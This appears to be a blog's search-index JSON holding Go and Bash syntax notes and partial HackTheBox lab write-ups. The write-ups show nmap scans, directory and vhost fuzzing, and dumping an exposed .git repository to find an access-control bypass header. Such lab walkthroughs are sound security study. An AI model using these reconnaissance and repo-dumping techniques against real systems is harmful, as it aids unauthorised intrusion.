[{"categories":null,"contents":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/introduction/","summary":" Hello World A sample go program is show here.\npackage main import \u0026#34;fmt\u0026#34; func main() { message := greetMe(\u0026#34;world\u0026#34;) fmt.Println(message) } func greetMe(name string) string { return \u0026#34;Hello, \u0026#34; + name + \u0026#34;!\u0026#34; } Run the program as below:\n$ go run hello.go Variables Normal Declaration:\nvar msg string msg = \u0026#34;Hello\u0026#34; Shortcut:\nmsg := \u0026#34;Hello\u0026#34; Constants const Phi = 1.618 ","tags":null,"title":"Introduction"},{"categories":null,"contents":" Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.Println(\u0026#34;Value is\u0026#34;, b) func getPointer () (myPointer *int) { a := 234 return \u0026amp;a a := new(int) *a = 234 Pointers point to a memory location of a variable. Go is fully garbage-collected.\nType Conversion i := 2 f := float64(i) u := uint(i) Slice slice := []int{2, 3, 4} slice := []byte(\u0026#34;Hello\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/types/","summary":"Strings str := \u0026#34;Hello\u0026#34; Multiline string\nstr := `Multiline string` Numbers Typical types\nnum := 3 // int num := 3. // float64 num := 3 + 4i // complex128 num := byte(\u0026#39;a\u0026#39;) // byte (alias for uint8) Other Types\nvar u uint = 7 // uint (unsigned) var p float32 = 22.7 // 32-bit float Arrays // var numbers [5]int numbers := [...]int{0, 0, 0, 0, 0} Pointers func main () { b := *getPointer() fmt.","tags":null,"title":"Basic Types"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.Printf(\u0026#34;At position %d, the character %s is present\\n\u0026#34;, i, val) n := 0 x := 42 for n != x { n := guess() } ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/basic/flow-control/","summary":"Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) Switch switch day { case \u0026#34;sunday\u0026#34;: // cases don\u0026#39;t \u0026#34;fall through\u0026#34; by default! fallthrough case \u0026#34;saturday\u0026#34;: rest() default: work() } Loop for count := 0; count \u0026lt;= 10; count++ { fmt.Println(\u0026#34;My counter is at\u0026#34;, count) } entry := []string{\u0026#34;Jack\u0026#34;,\u0026#34;John\u0026#34;,\u0026#34;Jones\u0026#34;} for i, val := range entry { fmt.","tags":null,"title":"Flow Control"},{"categories":null,"contents":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/go/advanced/files/","summary":" Condition if day == \u0026#34;sunday\u0026#34; || day == \u0026#34;saturday\u0026#34; { rest() } else if day == \u0026#34;monday\u0026#34; \u0026amp;\u0026amp; isTired() { groan() } else { work() } if _, err := doThing(); err != nil { fmt.Println(\u0026#34;Uh oh\u0026#34;) ","tags":null,"title":"File Manipulation"},{"categories":null,"contents":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://umarbaevb.github.io/notes/bash/basic/","summary":" Variable NAME=\u0026#34;John\u0026#34; echo $NAME echo \u0026#34;$NAME\u0026#34; echo \u0026#34;${NAME} Condition if [[ -z \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is empty\u0026#34; elif [[ -n \u0026#34;$string\u0026#34; ]]; then echo \u0026#34;String is not empty\u0026#34; fi ","tags":null,"title":"Bash Variables"},{"categories":null,"contents":"Backend Enumeration nmap ","date":"November 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/backend/images/backend.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/backend/","summary":"Backend Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: Backend"},{"categories":null,"contents":"Health Enumeration nmap └─$ nmap -Pn -p- 10.10.11.176 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:01 GMT Warning: 10.10.11.176 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.176 (10.10.11.176) Host is up (0.17s latency). Not shown: 60437 closed tcp ports (conn-refused), 5096 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 142.48 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.176 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:04 GMT Nmap scan report for 10.10.11.176 (10.10.11.176) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA) | 256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA) |_ 256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: HTTP Monitoring Tool |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 36.70 seconds Web Server gobuster └─$ gobuster dir -u http://health.htb/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x txt,html,php --no-error -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://health.htb/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 275] /.html (Status: 403) [Size: 275] /.html.html (Status: 403) [Size: 275] /.html.txt (Status: 403) [Size: 275] /.html.php (Status: 403) [Size: 275] /index.php (Status: 200) [Size: 7354] /js (Status: 301) [Size: 305] [--\u0026gt; http://health.htb/js/] /css (Status: 301) [Size: 306] [--\u0026gt; http://health.htb/css/] /.htm (Status: 403) [Size: 275] /.htm.txt (Status: 403) [Size: 275] /.htm.html (Status: 403) [Size: 275] /.htm.php (Status: 403) [Size: 275] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://health.htb/javascript/] vhosts └─$ wfuzz -u http://health.htb/ -H \u0026#39;Host: FUZZ.health.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 620 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://health.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000689: 400 10 L 35 W 301 Ch \u0026#34;gc._msdcs\u0026#34; Foothold ","date":"November 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/health/images/health.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/health/","summary":"Health Enumeration nmap └─$ nmap -Pn -p- 10.10.11.176 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 18:01 GMT Warning: 10.10.11.176 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.176 (10.10.11.176) Host is up (0.17s latency). Not shown: 60437 closed tcp ports (conn-refused), 5096 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 142.","tags":["HTB"],"title":"[HTB] Machine: Health"},{"categories":null,"contents":"Updown Enumeration nmap └─$ nmap -Pn -p- 10.10.11.177 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 16:46 GMT Warning: 10.10.11.177 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.177 (10.10.11.177) Host is up (0.19s latency). Not shown: 64486 closed tcp ports (conn-refused), 1047 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 109.57 seconds └─$ nmap -Pn -p22,80 -sC -sV 10.10.11.177 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 16:49 GMT Nmap scan report for 10.10.11.177 (10.10.11.177) Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA) | 256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA) |_ 256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Is my Website up ? Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds Web Server gobuster └─$ gobuster dir -u http://10.10.11.177/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.177/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.php (Status: 200) [Size: 1131] /.html (Status: 403) [Size: 277] /.php (Status: 403) [Size: 277] /dev (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.177/dev/] vhosts └─$ wfuzz -u http://siteisup.htb/ -H \u0026#39;Host: FUZZ.siteisup.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 93 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://siteisup.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000019: 403 9 L 28 W 281 Ch \u0026#34;dev\u0026#34; dev.siteisup.htb If I used only directory-list-2.3-medium.txt, I would\u0026rsquo;ve missed .git repo Always use multiple wordlists raft-medium-words.txt for example └─$ gobuster dir -u http://siteisup.htb/dev/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -x txt,html,js,php --no-error -t 50 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://siteisup.htb/dev/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.php (Status: 403) [Size: 277] /index.php (Status: 200) [Size: 0] /.html.js (Status: 403) [Size: 277] /.htm.txt (Status: 403) [Size: 277] /.htm.html (Status: 403) [Size: 277] /.htm (Status: 403) [Size: 277] /.htm.js (Status: 403) [Size: 277] /.htm.php (Status: 403) [Size: 277] /.html.html (Status: 403) [Size: 277] /.html (Status: 403) [Size: 277] /.html.php (Status: 403) [Size: 277] /.html.txt (Status: 403) [Size: 277] /. (Status: 200) [Size: 0] /.htaccess.txt (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htaccess.js (Status: 403) [Size: 277] /.phtml (Status: 403) [Size: 277] /.htc.txt (Status: 403) [Size: 277] /.htc.html (Status: 403) [Size: 277] /.htc (Status: 403) [Size: 277] /.htc.js (Status: 403) [Size: 277] /.htc.php (Status: 403) [Size: 277] /.html_var_DE.html (Status: 403) [Size: 277] /.html_var_DE.txt (Status: 403) [Size: 277] /.html_var_DE (Status: 403) [Size: 277] /.html_var_DE.php (Status: 403) [Size: 277] /.html_var_DE.js (Status: 403) [Size: 277] /.htpasswd (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /.htpasswd.js (Status: 403) [Size: 277] /.htpasswd.php (Status: 403) [Size: 277] /.git (Status: 301) [Size: 315] [--\u0026gt; http://siteisup.htb/dev/.git/] Foothold SSRF But nothing interesting comes of it Let\u0026rsquo;s navigate to http://10.10.11.177/dev/.git/ We will use git-dumper sudo pip3 install git-dumper └─$ git-dumper http://10.10.11.177/dev/.git/ . [-] Testing http://10.10.11.177/dev/.git/HEAD [200] [-] Testing http://10.10.11.177/dev/.git/ [200] \u0026lt;SNIP\u0026gt; [-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/origin/ [200] [-] Fetching http://10.10.11.177/dev/.git/logs/refs/remotes/origin/HEAD [200] [-] Running git checkout . Updated 6 paths from the index We see why couldn\u0026rsquo;t access dev.siteisup.htb └─$ cat .htaccess SetEnvIfNoCase Special-Dev \u0026#34;only4dev\u0026#34; Required-Header Order Deny,Allow Deny from All Allow from env=Required-Header ","date":"November 9, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/updown/images/updown.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/updown/","summary":"Updown Enumeration nmap └─$ nmap -Pn -p- 10.10.11.177 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-09 16:46 GMT Warning: 10.10.11.177 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.177 (10.10.11.177) Host is up (0.19s latency). Not shown: 64486 closed tcp ports (conn-refused), 1047 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 109.","tags":["HTB"],"title":"[HTB] Machine: Updown"},{"categories":null,"contents":"BackendTwo Enumeration nmap ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/backendtwo/images/backendtwo.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/backendtwo/","summary":"BackendTwo Enumeration nmap ","tags":["HTB"],"title":"[HTB] Machine: BackendTwo"},{"categories":null,"contents":"Devzat Enumeration nmap └─$ nmap -Pn -p- 10.10.11.118 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 18:09 GMT Nmap scan report for 10.10.11.118 (10.10.11.118) Host is up (0.17s latency). Not shown: 65527 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 5178/tcp filtered unknown 8000/tcp open http-alt 10716/tcp filtered unknown 28278/tcp filtered unknown 40190/tcp filtered unknown 48590/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 91.00 seconds └─$ nmap -Pn -p22,80,8000 -sC -sV 10.10.11.118 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 18:09 GMT Nmap scan report for 10.10.11.118 (10.10.11.118) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://devzat.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) 8000/tcp open ssh (protocol 2.0) | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA) | fingerprint-strings: | NULL: |_ SSH-2.0-Go 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.94%I=7%D=11/7%Time=654A7D5F%P=x86_64-pc-linux-gnu%r(NU SF:LL,C,\u0026#34;SSH-2\\.0-Go\\r\\n\u0026#34;); Service Info: Host: devzat.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds Web server gobuster └─$ gobuster dir -u http://devzat.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://devzat.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: js,php,txt,html [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /.html (Status: 403) [Size: 275] /images (Status: 301) [Size: 309] [--\u0026gt; http://devzat.htb/images/] /index.html (Status: 200) [Size: 6527] /assets (Status: 301) [Size: 309] [--\u0026gt; http://devzat.htb/assets/] /README.txt (Status: 200) [Size: 877] /javascript (Status: 301) [Size: 313] [--\u0026gt; http://devzat.htb/javascript/] /generic.html (Status: 200) [Size: 4851] /elements.html (Status: 200) [Size: 18850] /LICENSE.txt (Status: 200) [Size: 17128] vhosts └─$ wfuzz -u http://devzat.htb/ -H \u0026#39;Host: FUZZ.devzat.htb\u0026#39; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://devzat.htb/ Total requests: 19966 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000003745: 200 20 L 35 W 510 Ch \u0026#34;pets\u0026#34; 000009532: 400 12 L 53 W 423 Ch \u0026#34;#www\u0026#34; pets.devzat.htb gobuster └─$ gobuster dir -u http://pets.devzat.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error --exclude-length 510 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://pets.devzat.htb/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 510 [+] User Agent: gobuster/3.6 [+] Extensions: txt,html,js,php [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /css (Status: 301) [Size: 40] [--\u0026gt; /css/] /build (Status: 301) [Size: 42] [--\u0026gt; /build/] Rerun nmap on new vhost └─$ nmap -Pn -p80 -sC -sV pets.devzat.htb --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 19:06 GMT Nmap scan report for pets.devzat.htb (10.10.11.118) Host is up (0.25s latency). rDNS record for 10.10.11.118: devzat.htb PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-title: Pet Inventory | http-git: | 10.10.11.118:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... |_ Last commit message: back again to localhost only | http-server-header: | Apache/2.4.41 (Ubuntu) |_ My genious go pet server Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/devzat/images/devzat.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/devzat/","summary":"Devzat Enumeration nmap └─$ nmap -Pn -p- 10.10.11.118 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 18:09 GMT Nmap scan report for 10.10.11.118 (10.10.11.118) Host is up (0.17s latency). Not shown: 65527 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 5178/tcp filtered unknown 8000/tcp open http-alt 10716/tcp filtered unknown 28278/tcp filtered unknown 40190/tcp filtered unknown 48590/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 91.","tags":["HTB"],"title":"[HTB] Machine: Devzat"},{"categories":null,"contents":"Gobox Enumeration nmap └─$ nmap -Pn -p- 10.10.11.113 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 17:09 GMT Warning: 10.10.11.113 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.113 (10.10.11.113) Host is up (0.18s latency). Not shown: 65508 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 8080/tcp open http-proxy └─$ nmap -Pn -p22,80,4566,8080 -sC -sV 10.10.11.113 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 17:11 GMT Nmap scan report for 10.10.11.113 (10.10.11.113) Host is up (0.23s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA) | 256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA) |_ 256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519) 80/tcp open http nginx |_http-title: Hacking eSports | {{.Title}} 4566/tcp open http nginx |_http-title: 403 Forbidden 8080/tcp open http nginx |_http-title: Hacking eSports | Home page Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.09 seconds Web Server Port 8080 gobuster └─$ gobuster dir -u http://10.10.11.113/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.113/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.6 [+] Extensions: html,js,php,txt [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /index.html (Status: 200) [Size: 5] /index.php (Status: 200) [Size: 1803] /css (Status: 301) [Size: 162] [--\u0026gt; http://10.10.11.113/css/] └─$ gobuster dir -u http://10.10.11.113:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,js,php --no-error -t 50 --exclude-length 1752 =============================================================== Gobuster v3.6 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.113:8080/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] Exclude Length: 1752 [+] User Agent: gobuster/3.6 [+] Extensions: php,txt,html,js [+] Timeout: 10s =============================================================== Starting gobuster in directory enumeration mode =============================================================== /forgot (Status: 301) [Size: 43] [--\u0026gt; /forgot/] ","date":"November 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/gobox/images/gobox.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/gobox/","summary":"Gobox Enumeration nmap └─$ nmap -Pn -p- 10.10.11.113 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-06 17:09 GMT Warning: 10.10.11.113 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.113 (10.10.11.113) Host is up (0.18s latency). Not shown: 65508 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 4566/tcp open kwtc 8080/tcp open http-proxy └─$ nmap -Pn -p22,80,4566,8080 -sC -sV 10.","tags":["HTB"],"title":"[HTB] Machine: Gobox"},{"categories":null,"contents":"Shibboleth Enumeration nmap └─$ nmap -Pn -p- 10.10.11.124 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 16:58 GMT Warning: 10.10.11.124 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.11.124 (10.10.11.124) Host is up (0.17s latency). Not shown: 65181 closed tcp ports (conn-refused), 353 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 87.95 seconds └─$ nmap -Pn -p80 -sC -sV 10.10.11.124 --min-rate 1000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-07 16:58 GMT Nmap scan report for 10.10.11.124 (10.10.11.124) Host is up (0.17s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 |_http-title: Did not follow redirect to http://shibboleth.htb/ |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: Host: shibboleth.htb Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds └─$ sudo nmap -sU -Pn -F -sC -sV 10.10.11.124 [sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-08 16:42 GMT Nmap scan report for shibboleth.htb (10.10.11.124) Host is up (0.17s latency). Not shown: 82 closed udp ports (port-unreach) PORT STATE SERVICE VERSION 9/udp open|filtered discard 19/udp open|filtered chargen 53/udp open|filtered domain 136/udp open|filtered profile 497/udp open|filtered retrospect 520/udp open|filtered route 623/udp open asf-rmcp 626/udp open|filtered serialnumberd 1029/udp open|filtered solid-mux 1900/udp open|filtered upnp 2048/udp open|filtered dls-monitor 5353/udp open|filtered zeroconf 9200/udp open|filtered wap-wsp 10000/udp open|filtered ndmp 17185/udp open|filtered wdbrpc 49181/udp open|filtered unknown 49191/udp open|filtered unknown 65024/udp open|filtered unknown 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port623-UDP:V=7.94%I=7%D=11/8%Time=654BBACD%P=x86_64-pc-linux-gnu%r(ipm SF:i-rmcp,1E,\u0026#34;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01 SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 209.51 seconds Web server gobuster └─$ gobuster dir -u http://shibboleth.htb/ -w 